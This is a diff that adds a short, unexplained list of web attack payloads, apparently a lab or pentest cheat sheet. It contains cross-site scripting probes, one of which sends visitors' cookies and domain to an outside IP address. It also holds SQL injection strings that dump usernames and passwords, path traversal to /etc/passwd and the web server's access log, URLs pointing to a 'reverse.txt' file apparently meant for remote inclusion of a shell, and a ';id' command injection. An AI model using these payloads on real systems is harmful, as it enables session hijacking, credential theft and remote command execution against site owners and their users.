@@ -1,0 +1,31 @@
+<sCript>alert(1)</sCript>
+
+<sCript>alert(2)</sCript>
+
+<sCript>alert(document.cookie)</sCript>
+
+<Script>document.location='http://5.2.77.209/?cookies='+document.domain+':'+document.cookie</Script>
+
+
+userid order by username
+
+userid IN (SELECT pw FROM user);
+
+userid IN (SELECT password FROM user);
+
+1 union select username, password from user where userid=2
+userid union select username, password from user where userid=userid
+userid union select username, password from user
+
+
+../../../../../../../etc/passwd
+../../../../../../../var/log/apache2/access.log
+
+http://10.55.200.187
+http://10.55.200.187/websec/images/reverse.txt
+
+http://10.55.200.187/6666/text.txt
+
+
+;id
+
